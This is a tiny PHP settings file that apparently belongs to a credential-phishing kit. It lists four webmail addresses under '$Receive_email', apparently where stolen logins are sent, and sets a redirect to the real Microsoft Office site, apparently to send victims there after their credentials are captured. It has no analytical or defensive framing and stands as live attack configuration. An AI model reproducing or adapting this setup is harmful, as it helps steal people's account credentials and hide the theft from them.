<?php 
$Receive_email="arnulfoolerudyje15@gmail.com, wilmerharsylab458@gmail.com,smithbrown945@yahoo.com,re5ult.007@yandex.com";
$redirect="https://www.office.com/";
?>